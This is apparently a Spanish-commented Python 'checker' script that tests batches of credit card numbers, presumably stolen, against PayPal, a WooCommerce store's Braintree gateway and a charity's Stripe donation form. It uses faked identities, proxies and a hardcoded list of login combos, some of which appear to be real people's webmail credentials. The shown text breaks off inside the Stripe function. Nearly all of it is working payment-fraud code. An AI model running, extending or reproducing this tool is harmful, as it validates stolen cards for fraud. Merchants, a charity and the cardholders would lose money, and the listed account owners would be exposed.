# Coded by `APFRS-5`
import requests, random, sys, os, base64, secrets, uuid, names, json, re
from faker import Faker
from rich import print
from rich.console import Console
from dataclasses import dataclass

########## START PROXY ############
with open("data.json", "r") as datafi:
    configss=json.load(datafi)
    proxi_gen = configss.get("proxy")

proxies={'http':proxi_gen, 'https':proxi_gen}
########### END PROXY #############
fake = Faker("en_US")
def info():
    #=================// SCRIPT BY APFRS5 //=================#
    first, last = fake.first_name(), fake.last_name()
    phone = random.randint(1000000000, 9999999999)
    return first, last, phone
def paypal1(card):
    #=================// SCRIPT BY APFRS5 //=================#
    with requests.Session() as session:
        try:
            cc = card.replace("/", "|")
            firstn, lastn, phone = info()
            num, mes, ano, cvv = cc.strip().split('|')
            if len(ano) == 2:
                ano = f'20{ano}'
            url = "https://www.paypal.com/smart/buttons?style.label=paypal&style.layout=vertical&style.color=gold&style.shape=rect&style.tagline=false&style.menuPlacement=below&style.shouldApplyRebrandedStyles=false&style.isButtonColorABTestMerchant=false&allowBillingPayments=true&applePaySupport=false&buttonSessionID=uid_8cc9d02a7d_mtk6ndy6nde&buttonSize=large&customerId=&clientID=AQL7ArMZBhEd8hIjSM85XzVu94Qh7Bd6To1hx6h3qOm6s_NV-woi32ic3uv2PirvFtdsbehFlxOEI4h_&clientMetadataID=uid_e058bb2cbb_mtk6ndy6mjm&commit=true&components.0=buttons&currency=HKD&debug=false&disableSetCookie=true&eagerOrderCreation=false&enableFunding.0=venmo&env=production&experiment.enableVenmo=false&experiment.venmoVaultWithoutPurchase=false&experiment.spbEagerOrderCreation=false&experiment.venmoWebEnabled=false&experiment.isWebViewEnabled=false&experiment.isPaypalRebrandEnabled=false&experiment.isPaypalRebrandABTestEnabled=false&experiment.defaultBlueButtonColor=defaultBlue_lightBlue&experiment.venmoEnableWebOnNonNativeBrowser=false&flow=purchase&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjp0cnVlLCJpbnN0YWxsbWVudHMiOmZhbHNlLCJ2ZW5kb3JzIjp7InZpc2EiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sIm1hc3RlcmNhcmQiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImFtZXgiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImRpc2NvdmVyIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiaGlwZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiZWxvIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwibWFlc3RybyI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiZGluZXJzIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJjdXAiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9LCJjYl9uYXRpb25hbGUiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9fSwiZ3Vlc3RFbmFibGVkIjpmYWxzZX0sInZlbm1vIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjpmYWxzZX0sIml0YXUiOnsiZWxpZ2libGUiOmZhbHNlfSwiY3JlZGl0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImFwcGxlcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInNlcGEiOnsiZWxpZ2libGUiOmZhbHNlfSwiaWRlYWwiOnsiZWxpZ2libGUiOmZhbHNlfSwiYmFuY29udGFjdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJnaXJvcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImVwcyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzb2ZvcnQiOnsiZWxpZ2libGUiOmZhbHNlfSwibXliYW5rIjp7ImVsaWdpYmxlIjpmYWxzZX0sInAyNCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ3ZWNoYXRwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwicGF5dSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJibGlrIjp7ImVsaWdpYmxlIjpmYWxzZX0sInRydXN0bHkiOnsiZWxpZ2libGUiOmZhbHNlfSwib3h4byI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJib2xldG8iOnsiZWxpZ2libGUiOmZhbHNlfSwiYm9sZXRvYmFuY2FyaW8iOnsiZWxpZ2libGUiOmZhbHNlfSwibWVyY2Fkb3BhZ28iOnsiZWxpZ2libGUiOmZhbHNlfSwibXVsdGliYW5jbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzYXRpc3BheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwYWlkeSI6eyJlbGlnaWJsZSI6ZmFsc2V9fQ&intent=capture&locale.country=MX&locale.lang=es&hasShippingCallback=false&platform=mobile&renderedButtons.0=paypal&renderedButtons.1=card&sessionID=uid_e058bb2cbb_mtk6ndy6mjm&sdkCorrelationID=prebuild&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVFMN0FyTVpCaEVkOGhJalNNODVYelZ1OTRRaDdCZDZUbzFoeDZoM3FPbTZzX05WLXdvaTMyaWMzdXYyUGlydkZ0ZHNiZWhGbHhPRUk0aF8mZW5hYmxlLWZ1bmRpbmc9dmVubW8mY3VycmVuY3k9SEtEIiwiYXR0cnMiOnsiZGF0YS1zZGstaW50ZWdyYXRpb24tc291cmNlIjoiYnV0dG9uLWZhY3RvcnkiLCJkYXRhLXVpZCI6InVpZF96aHV1bGxtaWxmaXVtY3djamhsZHpyb215bW91eHIifX0&sdkVersion=5.0.500&storageID=uid_65e3218386_mtk6ndy6mjm&buttonColor.shouldApplyRebrandedStyles=false&buttonColor.color=gold&buttonColor.isButtonColorABTestMerchant=false&supportedNativeBrowser=true&supportsPopups=true&vault=false"
            headers = {"Host": "www.paypal.com", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8","Sec-GPC": "1","Accept-Language": "es-MX,es;q=0.9",}
            res = session.get(url, headers=headers)
            match = re.search(r'"facilitatorAccessToken"\s*:\s*"([^"]+)"', res.text)
            if match:
                token = match.group(1)
            else:
                print("[INFO] Token Not Found")
            headers = { "Host": "www.paypal.com","authorization": f"Bearer {token}","content-type": "application/json","Sec-GPC": "1", "Accept-Language": "es-MX,es;q=0.9", }
            data = f"""{{"purchase_units":[{{"amount":{{"value":"0.1","currency_code":"MXN"}},"description":"Carlls"}}],"intent":"CAPTURE","application_context":{{}}}}"""
            res = session.post("https://www.paypal.com/v2/checkout/orders", headers=headers, data=data)
            tok = res.json()["id"]
            headers = { "Host": "www.paypal.com","User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36","x-country": "MX", "x-app-name": "standardcardfields", "content-type": "application/json","Accept-Language": "es-MX,es;q=0.9", }
            data = f"""{{"query":"mutation payWithCard( $token: String! $card: CardInput! $phoneNumber: String $firstName: String $lastName: String $shippingAddress: AddressInput $billingAddress: AddressInput $email: String $currencyConversionType: CheckoutCurrencyConversionType $installmentTerm: Int $identityDocument: IdentityDocumentInput ) {{ approveGuestPaymentWithCreditCard( token: $token card: $card phoneNumber: $phoneNumber firstName: $firstName lastName: $lastName email: $email shippingAddress: $shippingAddress billingAddress: $billingAddress currencyConversionType: $currencyConversionType installmentTerm: $installmentTerm identityDocument: $identityDocument ) {{ flags {{ is3DSecureRequired }} cart {{ intent cartId buyer {{ userId auth {{ accessToken }} }} returnUrl {{ href }} }} paymentContingencies {{ threeDomainSecure {{ status method redirectUrl {{ href }} parameter }} }} }} }}","variables":{{"token":"{tok}","card":{{"cardNumber":"{num}","type":"MASTER_CARD","expirationDate":"{mes}/{ano}","postalCode":"20213","securityCode":"{cvv}"}},"phoneNumber":"{phone}","firstName":"{firstn}","lastName":"{lastn}","billingAddress":{{"givenName":"Carlos ","familyName":"salas","line1":"Calle 912","line2":"O","city":"None","state":"AGS","postalCode":"20213","country":"MX"}},"shippingAddress":{{"givenName":"{firstn}","familyName":"{lastn}","line1":"Calle 912","line2":"O","city":"None","state":"AGS","postalCode":"20213","country":"MX"}},"email":"{mail()}","currencyConversionType":"PAYPAL"}},"operationName":null}}"""
            res = session.post("https://www.paypal.com/graphql?fetch_credit_form_submit", headers=headers, data=data)
            valid_indicators = [
    'is3DSecureRequired', 'OTP', 'INVALID_SECURITY_CODE','EXISTING_ACCOUNT_RESTRICTED', 'INVALID_BILLING_ADDRESS'
            ]
            matchs = next((indicator for indicator in valid_indicators if indicator in res.text), None)
            if matchs:
                return f"Card Approved ✅ - {matchs}"
            elif "CARD_GENERIC_ERROR" in res.text:
                return "General Declined ❌ - CARD_GENERIC_ERROR"
            elif '"errors":' in res.text:
                return f"Declined ❌ - {res.json()["errors"][0]["message"]}"
            else:
                return "Card Approved ✅ - Donation was success"
        except:
            return "Declined ❌ - Requests failed"

#=================// SCRIPT BY APFRS5 //=================#
#Gate b3 - Clase BraintreeChecker
@dataclass
class ConfigsPAge:
    
    def ResponseHtml(self, response: str = None):
        """Procesa la respuesta y determina si está aprobada o rechazada."""
        if not response:
            return 'Declined! ❌', 'No response'

        # ✅ SOLO estas se consideran aprobadas reales (1000: Approved)
        approved_exact_patterns = [
            'Nice! New payment method added',
            'Payment method successfully added.',
            'Duplicate card exists in the vault.',
            '81724: Duplicate card exists in the vault.'
        ]

        # ⚠️ Estas son respuestas informativas o semi-aprobadas
        informative_patterns = [
            'avs_and_cvv',
            'cvv: Gateway Rejected: cvv',
            'Insufficient Funds',
            'avs: Gateway Rejected: avs',
            'CVV.',
            'Card Issuer Declined CVV',
            'Invalid postal code and cvv',
            'Invalid postal code or street address'
        ]

        # Verificar aprobadas reales
        for pattern in approved_exact_patterns:
            if pattern in response:
                return 'Live ✅, 1000: Approved'

        # Verificar respuestas informativas
        for pattern in informative_patterns:
            if pattern in response:
                return f'Live ✅, {pattern}'

        # Si no coincide con nada, limpiar y devolver
        return f"Declined ❌, {self.clean_response(response)}"

    def clean_response(self, response: str) -> str:
        """Limpia la respuesta removiendo tags HTML y formateando"""
        if not response:
            return "Declined general ❌"
            
        clean = re.sub('<[^>]+>', '', response)
        clean = ' '.join(clean.split())
        
        code_patterns = [
            r'Status code (\d+):\s*(.+)',
            r'(\d+)\s*:\s*(.+)',
            r'Gateway Rejected:\s*(.+)',
        ]
        
        for pattern in code_patterns:
            match = re.search(pattern, clean)
            if match:
                if len(match.groups()) == 2:
                    return f"Code {match.group(1)}: {match.group(2)}"
                elif len(match.groups()) == 1:
                    return f"Gateway: {match.group(1)}"
        
        return clean[:80] if len(clean) > 80 else clean

    def SessionId(self):
        return str(uuid.uuid4())

    def Ccs(self, cards: str = None):
        if '|' in cards: 
            return cards.split('|')
        elif ':' in cards: 
            return cards.split(':')
        elif ',' in cards: 
            return cards.split(',')
        elif '-' in cards: 
            return cards.split('-')
        return [cards]

    @classmethod
    def QueryText(self, data: str = None, chainOne: str = None, chainTwo: str = None):
        if data is None:
            return 'value not found'
        
        try:
            start_index = data.index(chainOne) + len(chainOne)
            end_index = data.index(chainTwo, start_index)
            return data[start_index:end_index]
        except:
            return 'value not found'
    
    @classmethod
    def QueryTextMultiple(self, data: str = None, patterns: list = None):
        if data is None or not patterns:
            return 'value not found'
            
        for pattern in patterns:
            chainOne, chainTwo = pattern
            result = self.QueryText(data, chainOne, chainTwo)
            if result != 'value not found':
                return result
                
        return 'value not found'

    def ExtractErrorMessage(self, html: str):
        """Extraer mensajes de error de diferentes formatos"""
        error_patterns = [
            ('class="woocommerce-error" role="alert">', '</ul>'),
            ('class="woocommerce-error">', '</ul>'),
            ('Status code', '<'),
        ]
        
        for pattern in error_patterns:
            error_text = self.QueryText(html, pattern[0], pattern[1])
            if error_text != 'value not found' and error_text.strip():
                return error_text.strip()
        
        return "Declined, Gateway Rejected ❌"
    
    @classmethod    
    def RandomName(self, dato: str = None):
        if dato == 'username': 
            return "{}{}{}".format(
                names.get_first_name(),
                names.get_last_name(),
                random.randint(1000000,9999999)
            )
        elif dato == 'email': 
            return "{}{}{}@gmail.com".format(
                names.get_first_name(),
                names.get_last_name(),
                random.randint(1000000,9999999)
            )
        elif dato == 'password': 
            return "{}{}#{}".format(
                names.get_first_name(),
                names.get_last_name(),
                random.randint(1000000,9999999)
            )
        elif dato == 'numero':
            return ''.join([str(random.randint(0, 9)) for _ in range(10)])
        else:
            return 'valores incorrectos'

    @classmethod
    def DecodeBear(self, dato: str = None):
        if not dato:
            return None
            
        try:
            token_encoding = base64.b64decode(dato).decode('utf-8')
            return self.QueryText(token_encoding, '"authorizationFingerprint":"', '","')
        except:
            return None

class BraintreeChecker:
    def __init__(self):
        self.session = None
        # Lista de combos de correo y contraseña
        self.account_combos = [
            {'email': 'caqueta4544848@jujo2026.lat', 'password': '@Jujo2510'},
            {'email': 'panela9832938@tezhonia.lat', 'password': '@Jujo0112'},
            {'email': 'enrique0191021@jujo2026.lat', 'password': '@Jujo2510'},
            {'email': 'panela9846855@tezhonia.lat', 'password': '@Jujo0112'},
            {'email': 'marianavega928@jujo2026.lat', 'password': '@Jujo2510'},
            {'email': 'panela9846548@tezhonia.lat', 'password': '@Jujo0112'},
            {'email': 'luispega921823@jujo2026.lat', 'password': '@Jujo2510'},
            {'email': 'panela5645489@tezhonia.lat', 'password': '@Jujo0112'},
            {'email': 'eduardomoca287@jujo2026.lat', 'password': '@Jujo2510'},
            {'email': 'panela3314546@tezhonia.lat', 'password': '@Jujo0112'},
            {'email': 'angelosatra0239@jujo2026.lat', 'password': '@Jujo2510'},
            {'email': 'panela9864565@tezhonia.lat', 'password': '@Jujo0112'},
            {'email': 'miguelturbay272@jujo2026.lat', 'password': '@Jujo2510'},
            {'email': 'romana97w@hotmail.com', 'password':'3B#t7Yy_k'},
            {'email':'cacrlis@yahoo.com', 'password':'v(0TmSBrL'
            }
           ]
    
    def get_random_account(self):
   
        return random.choice(self.account_combos)
    
    def mains(self, card):
        try: 
            self.Nombre = ConfigsPAge.RandomName('username')
            self.UseMail = ConfigsPAge.RandomName('email')

            # Seleccionar combo aleatorio para este chequeo
            random_account = self.get_random_account()
            selected_email = random_account['email']
            selected_password = random_account['password']

            session = requests.Session()
            timeout = 30
            session.proxies.update(proxies)
            
            # Paso 1: Login
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-419,es;q=0.9,en;q=0.8',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/134.0.0.0 Safari/537.36',
            }
            
            r1 = session.get('https://bandc.com/my-account/', headers=headers, timeout=timeout)
            html1 = r1.text
            self.nonce_login = ConfigsPAge.QueryText(html1, 'name="woocommerce-login-nonce" value="', '"')

            headers = {
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://bandc.com',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/134.0.0.0 Safari/537.36',
            }
            data = {
                'username': selected_email,
                'password': selected_password,
                'woocommerce-login-nonce': self.nonce_login,
                '_wp_http_referer': '/my-account/',
                'login': 'Log in',
            }
            
            session.post('https://bandc.com/my-account/', headers=headers, data=data, allow_redirects=True, timeout=timeout)

            # Paso 2: Obtener método de pago
            r2 = session.get('https://bandc.com/my-account/add-payment-method/', headers=headers, timeout=timeout)
            html2 = r2.text
            
            payment_nonce_patterns = [
                ['name="woocommerce-add-payment-method-nonce" value="', '"'],
                ['id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="', '"'],
                ['name="_wpnonce" value="', '"'],
            ]
            
            self.payment_nonce = ConfigsPAge.QueryTextMultiple(html2, payment_nonce_patterns)
            self.client_token_nonce = ConfigsPAge.QueryText(html2, '"client_token_nonce":"', '"')

            # Paso 3: Obtener token cliente
            data = {
                'action': 'wc_braintree_credit_card_get_client_token',
                'nonce': self.client_token_nonce,
            }
            
            r3 = session.post('https://bandc.com/wp-admin/admin-ajax.php', data=data, timeout=timeout)
            result = r3.json()
            
            if not result or 'data' not in result:
                return 'Declined! ❌, Error: Invalid client token response'
            
            self.data_J = result['data']
            self.client_eyj = ConfigsPAge.DecodeBear(self.data_J)
            
            if not self.client_eyj:
                return 'Declined! ❌, Error: No se pudo obtener token de cliente'

            self.session_client_id = ConfigsPAge().SessionId()
            self.ccs = card.strip().split("|")

            if len(self.ccs) != 4:
                return 'Declined! ❌ Error: Formato de tarjeta inválido'

            # Paso 4: Tokenizar
            headers = {
                'accept': '*/*',
                'authorization': f'Bearer {self.client_eyj}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'user-agent': 'Mozilla/5.0',
            }
            json_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': self.session_client_id,
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': self.ccs[0],
                            'expirationMonth': self.ccs[1],
                            'expirationYear': self.ccs[2],
                            'cvv': self.ccs[3],
                        },
                        'options': {'validate': False},
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }
            
            r4 = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data, timeout=timeout)
            r4_text = r4.text
            if r4.status_code != 200:
                return f'Declined! ❌, Error en tokenización: {r4.status_code}'
            
            self.token_card = ConfigsPAge.QueryText(r4_text, '"token":"', '"')
            if not self.token_card:
                return 'Declined! ❌, Error: No se pudo tokenizar la tarjeta'

            # Paso 5: Añadir método
            data = [
                ('payment_method', 'braintree_credit_card'),
                ('wc_braintree_credit_card_payment_nonce', self.token_card),
                ('_wpnonce', self.payment_nonce),
                ('_wp_http_referer', '/my-account/add-payment-method/'),
                ('woocommerce_add_payment_method', '1'),
            ]
            
            avs = session.post('https://bandc.com/my-account/add-payment-method/', data=data, timeout=timeout)
            avs_text = avs.text

            if ('Nice! New payment method' in avs_text or 
                'Payment method added successfully' in avs_text or 
                'payment-methods/' in str(avs.url) or 
                "81724: Duplicate card exists in the vault." in avs_text): 
                return 'Approved! ✅, 1000: Approved'

            config = ConfigsPAge()
            error_message = config.ExtractErrorMessage(avs_text)
            return config.ResponseHtml(error_message)
                
        except Exception as e: 
            return f'Declined! ❌, Declined - Error: {str(e)}'
            


def mass(file, func):
    with open(file, "r") as fi:
        for card in fi:
            rws = func(card)
            print(f"[bold blue]{'='*29}\nCard: {card}\nResult: {rws}\n")
def saves():
    file = input("Ingresa el archivo a pegar: ")
    print("[[green]×[/green]] Pega tu material aquí y ejecuta Ctrl+C\n")
    os.system(f"cat > {file}")
    print("\n[bold green]SUCCESS > Guardado exitosamente.")
    
def saludo():
    console = Console();os.system("clear")
    text = r"""
   ___        ___ _     _    
  / __\ _    / __\ |__ | | __
 / /  _| |_ / /  | '_ \| |/ /
/ /__|_   _/ /___| | | |   < 
\____/ |_| \____/|_| |_|_|\_\
"""
    console.print(text, style="bold green")
def namess():
    nombre = fake.first_name_male() if fake.random_int(0, 1) else fake.first_name_female()
    apellido = fake.last_name()
    nombre_completo = f"{nombre} | {apellido}"
    return nombre_completo
def mail():
    sysf=["salasx", "slamabd", "calrs", "polacd", "romad", "slamxgsv"]
    doms = ["hotmail.com", "gmail.com", "yahoo.com", "outlook.com"]
    return f"{random.choice(sysf)}@{random.choice(doms)}"

def found(html, start, end):
    try:
        star = html.index(start) + len(start)
        end= html.index(end, star)
        return html[star:end]
    except ValueError:
        return "None"

#Gate Stripe $1 - Función stripe
def stripe(card):
    with requests.Session() as session:
        try:
            session.proxies.update(proxies)
            first,last=namess().split("|");em=mail()
            cc = card.replace("/", "|");num,mes,ano,cvv=cc.strip().split("|")
            headers = {"Host": "patandtheelephant.org", "Connection": "keep-alive","Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8", "Sec-GPC": "1","Accept-Language": "es-MX,es;q=0.6",}
            res = session.get("https://patandtheelephant.org/donate/", headers=headers)
            form = found(res.text, 'wpforms-form wpforms-ajax-form" data-formid="', '"')
            aga = found(res.text, 'action="/donate/" data-token="', '"')
            headers = {"Host": "api.stripe.com", "Connection": "keep-alive", "sec-ch-ua-platform": "\"Android\"","User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36", "Accept": "application/json", "sec-ch-ua": "\"Chromium\";v=\"136\", \"Brave\";v=\"136\", \"Not.A/Brand\";v=\"99\"","Content-Type": "application/x-www-form-urlencoded","Accept-Language": "es-MX,es;q=0.6"}
            data = f"""type=card&billing_details[name]=Carlos+alas&card[number]={num}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=NA&sid=NA&payment_user_agent=stripe.js%2F328730e3ee%3B+stripe-js-v3%2F328730e3ee%3B+card-element&referrer=https%3A%2F%2Fpatandtheelephant.org&time_on_page=22342&client_attribution_metadata[client_session_id]=31785df7-cf5d-4e80-b0b3-ba474051ef85&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51J1AmUK3MzNNDzNpotVY4Yk6G9Tqmu7DHz2wmDZuBqnOCw8dSelm0mledmst5t7u1Hi8IF1yoU69nK6tjJKBunfw00zikEDgPJ&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzY2NjA0OTE4LCJjZGF0YSI6InNVRlluTjNyMkpPMmNBd0VvVTFPbjB3U0Z3SmFveGdvK2VXVERISURhNnpwbWhDUUYrTVNFd2tKTjZ3K1lJdlVFVzRHYmdKZFFJYnMydDdYQTFxdlN6ZmVESldnc0wxRHZTLy85MjBxSXdYRDJxWTllYW1EZVd5d0RURG9CcGFLSC9uMlJhZEZkSGN5TUtBZ1EvbDVzRXAzNUpZWHdyTG5MVXZoaUNwc2gralZKVnArbHdyaC9QY0w5eFc1RDhxZk1GNk13clYxK1Z0aU9XQnkiLCJwYXNza2V5IjoiU01XM0VvZDg1dUl5THRvZEM4MWJRWGFNbm1vNlpLNHFUa0tHeFBRWWRQdmpOQmN5YUhESG02Ni9xZW83ZUZVaDRPMVdlSmhXZWFSSEVWL2tLUkovdk1yeWRrR2x2dWIvNGVvbjAwMWlxdEpRRnc0c3dpWGpIaG1GQ2h2VjRjMXZMcGF4U200ZTlHNzZSYllzTnNZa2MwMW90SGtYL0lQZUEzYXRVUXAzb01nb3ZSbTdSQXVVN1h2TVNiZXRIT2lwOVJTcGNid2pCZmZRUmdKcmJkRXBsZWl0blNFeHVzMmhUTTV3YzVzUmFqRlNFZnpFcWsvakQ1RXVTNDg3ZWEyc3puZzM5WVRQams0Y2NVR005MnFTeHVnalFDc2Q0a1FFZFg2QVJmYm1qY2ltV0xzS0xXN1BkUWFnMDVZTlo0MmptZzI1SjNKNFZLeXh1K2F3OHFubm5SbXNRQmN5bTB6Q1hldDlWamJ0U2cvRnZOdXZtK1hRWDIxZkg3anBoTGk5dzdCVUdtMjRKU3N1eGZEeDV1SmQ1ZGloMFVtWmQzdExvdDNYaGE3aFA4RDVNeEFnVDJBTHhlTHJDV25BejBFNWFsVlQ3eWZMMXlnZjBISk5VMTgySW00TlhXVENYSlFLam03VFJFSnZDUEhQaVdqR3ZzcEFleFFUN21LWHJmZ3JnWndTR096Y09tN2o0bENoaDZ6MGJkMTFJai9INzh1Q0toYWxQRCtvQ1dmNmsrWlJGVVAvQU1zTGJNSGFDSDd1UWIrRlpnMUFmU3NmSSswWW9GWVNNWVZtdkJqcjkyaDJnU00ya0ZRWXc5TFVhR2I1Q21mb3R6d1lhSllYS1ZGRzZGUXNMQUJQK2NKODMxY1lkWW12aGk1T09zZ3dwcnNFeHVwSWVQS24xc3lDWEFUVjZqT21uQzJReEJRakp5VUNPRXR0aUlPaWlwdHBJNGdWek5rMENkWjZTNGlMRkhRRVYrZnQ4SGVxbWw4SFBPVEc5cUZWMUpaSlhsK2oyU05JL3NINjQwZlJvSHJadHhVUUlwajVSaGd1S0srVnVZUVB2TzdyaWE2SjA2N0JURFF2TllTUVNjUE40OE1oK0U2SkNzcUpRK29pZXhweTQwVDlNNnlKV3ppWlo0NmRIczFqM05zZk1JM3F0NVlNaDFEUnE1TGRmaEhsOUFSSjROdkhZRzlhUkdWUkxVMXpoOXBwQ3p5SXlNUk9FMlBxSDNaTWM2akxZMHVKUVFEZGJLeEtrU0xjQno4bVRWaXdXcmlSc2JEajk4anBUNzQ5TWxrRHl6ald5OFRvdXpWNWNYU29UYWNtaDcwNnhYMm1Tck9TWUZMK0F0VzU4VFdxS2IxSVVIWEpJaFRRL1I4dUR4QlVoVG0xRFFwWVFYdmh6RTdqMTNQNlA4R1Zta2VKUFJnMnhYa1FvQ1IvdnR5cTJLbXV6cnczb3U0cms0OWFmbEFCeFk0ZlBmcmQ5UTFCSzdtN0EwbTFIK2ExNmt3VVlJNnVYd3ZndHlpTGdwcjRNL2RqZER0cVQySDlrY0hXeWZWTTBkbjJXMXFERVZlN1JtR3FDMVJzVnZadW5hTW1HVVRXenJ4L1RkelRNQ3J2WmlYbXZ5OFRkdnBaTTJPVHhwcW9aYVJIalRCTm11YlJhdWtEc2xFYmZnbENPM1ZuN0FvWU51Ty9Ndy9EYm0xcy9xcWVwNUk4NEc5WSsvaEwvY091QWlPazR6cHZzRTczWXFHK3BSb3k1UkRCVWVpZlhJYmp4ZW11WkRyZ3NDeVJwOUViK1NrNjlQdlhPcWtKWnpraEVqakpxSTkwdW9OeUlLY2hxSFYveVZuQmszUFd0bmNySHMyRVlicVltQWRwbDVHUDZCamlMUW43RngrT2x5RFRYSmkyb3RFWThpeXdqRTR0OGNKVXZTa1BzQzJyNHZXVVpzOVA2djRmYXdSazVOK1M5anI3QW9EYnMvR2RWeFBuNnlVcmRzWjhmOHY4Wml1bVppcjNkNmpMRk5XZ0t3bCtoU3ZyVFB4SlNKSkJsaE5RZjFndlJzd3N4YWF4QU4wZkJaN1p4TzhMdGl3RTZIdTJid1J2NlFwZmFmVVUyZmpGQjdBVzRMMHNFbXcvWnllVy9sRTUrU0dSQjgzdUU4VHBSbnZFNDJXZy9IRjRLMmNtZ1BJVzBCaHN5MFUrMEFPSmdXaGkyOFI1UWRBNG5WWktGa05tOTc4WS9rWms2d25rN1BCSHB1ZWhBeWRpMGtubWdMaEh6MVJvMUQxUi9VaDFwckpaZzg2bmdoL1gyQ2g1K3V3cTI3UzhILzNjSW9kS1JRa3ovQ3BpdnV5MEhuMi9DSGRHQllQWVdhbytoZXJWZERTQXV2MzZ1bkNDMFQvSmkwZFE4eGJCOTFWLyt1bmFVZ1B2dUQwZlJzZmJ0Rk1RQW01bFIvaFdmZ2lYSmZTVEhmOUVPZGQyaXZCdnBUVHU0dz09Iiwia3IiOiIzZjIxNjg2NyIsInNoYXJkX2lkIjoyMjE5OTYwNzN9.tfWF-8d3QHk19LKViUNgi4BVnfRoTMBXtgrRNaTzbvs"""
            res = requests.post("https://api.stripe.com/v1/payment_methods", headers=headers, data=data)
            token = res.json()["id"]
            headers = {"Host": "patandtheelephant.org", "Connection": "keep-alive", "sec-ch-ua-platform": "\"Android\"", "X-Requested-With": "XMLHttpRequest","User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36","Accept": "application/json, text/javascript, */*; q=0.01", "sec-ch-ua": "\"Chromium\";v=\"136\", \"Brave\";v=\"136\", \"Not.A/Brand\";v=\"99\"","Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryJAY1IGLA3kt2zxyO","Accept-Language": "es-MX,es;q=0.6","Referer": "https://patandtheelephant.org/donate/",}
            data = f'''
------WebKitFormBoundaryJAY1IGLA3kt2zxyO
Content-Disposition: form-data; name=\"wpforms[fields][0][first]\"

{first.strip()}
